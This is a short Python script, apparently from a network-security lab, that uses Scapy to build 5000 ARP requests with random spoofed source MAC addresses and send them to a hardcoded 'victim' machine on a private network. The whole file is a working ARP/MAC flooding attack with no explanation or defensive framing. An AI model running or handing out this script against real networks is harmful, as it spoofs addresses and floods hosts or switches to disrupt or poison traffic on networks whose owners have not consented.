from scapy.all import *
from scapy.layers.inet import *
import random
import socket
import struct
import time

victim = "08:00:27:2c:a9:08"
victim_ip = "192.168.20.71"
my_ip = "192.168.20.11"
generated=0
packets=[]
how_many_packet=5000
def generate_some_packets(qta):
	for i in range(qta):
		generated_mac=RandMAC()
		packet=(Ether(dst=victim,src=generated_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip,hwsrc=generated_mac))
		packets.append(packet)
	
generate_some_packets(how_many_packet)

for i in range(how_many_packet):
	if i % 100 == 0 :
		print(i)
	sendp(packets[i],verbose=0)
